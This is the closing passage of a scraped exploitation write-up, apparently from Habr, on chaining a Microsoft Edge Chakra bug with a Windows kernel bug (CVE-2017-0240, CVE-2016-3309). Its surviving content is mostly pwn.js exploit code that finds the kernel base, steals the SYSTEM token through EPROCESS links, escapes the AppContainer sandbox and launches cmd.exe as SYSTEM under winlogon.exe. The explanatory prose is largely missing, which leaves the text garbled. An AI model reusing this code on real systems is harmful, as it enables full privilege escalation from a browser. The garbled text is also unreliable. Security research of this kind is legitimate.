['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="Final"></p><br><p>   YouTube    <a href="https://youtu.be/ZfeAyciYb5Y"></a>  ,     Microsoft Edge. </p><br><h2 id="itog">  Total </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  Materials </h2><br><ol><li> <a href="https://github.com/mrowensnobody/presentation">Liu Jin ‚Äî The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="http://powerofcommunity.net/poc2017/andrew.pdf">Andrew Wesie, Brian Pak ‚Äî 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://conference.hitb.org/hitbsecconf2017ams/materials/CLOSING%2520KEYNOTE%2520-%2520Natalie%2520Silvanovich%2520-%2520The%2520ECMA%2520and%2520The%2520Chakra.pdf">Natalie Silvanovich ‚Äî The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://recon.cx/2017/brussels/resources/slides/RECON-BRX-2017-Your_Chakra_Is_Not_Aligned.pdf">Natalie Silvanovich ‚Äî Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team ‚Äî cve-2018-8629-chakra.js</a> </li><li> <a href="https://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html">Quarkslab ‚Äî Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://www.siberas.de/blog/2017/10/05/exploitation_case_study_wild_pool_overflow_CVE-2016-3309_reloaded.html">Siberas ‚Äî Kernel Exploitation Case Study ‚Äî "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://github.com/sensepost/gdi-palettes-exp/blob/master/5A1F_Defcon_25_Demystifying_Kernel_Exploitation_By_Abusing_GDI_Objects_white_paper.pdf">Saif El-Sherei ‚Äî Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives">Diego Juarez ‚Äî Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf">Nicolas A. Economou ‚Äî Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://github.com/theori-io/pwnjs">pwn.js</a> </li></ol></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/455594/">https://habr.com/ru/post/455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../455582/index.html">Navigation in the store: through augmented reality to the desired shelf</a></li>
<li><a href="../455584/index.html">User interview by internal company forces: through mistakes to discoveries</a></li>
<li><a href="../455586/index.html">Robotics lecture series by Professor Gregor Sch√∂ner, Director of the Institute of Neuroinformatics (INI) Bochum, Germany</a></li>
<li><a href="../455588/index.html">How to educate your community, not to dance with a tambourine</a></li>
<li><a href="../455592/index.html">Viruses attacking industrial plants as a threat to physical security</a></li>
<li><a href="../455596/index.html">DevConfX :: Management - reports of managers in simple words</a></li>
<li><a href="../455598/index.html">Update exim urgently to 4.92 - an active infection is in progress</a></li>
<li><a href="../4556/index.html">Another site safely "zaguglen"</a></li>
<li><a href="../455600/index.html">3DEXPERIENCE Platform Helps Build Future Public Transport</a></li>
<li><a href="../455602/index.html">Providing browser crashes with behavioral fuzzing</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>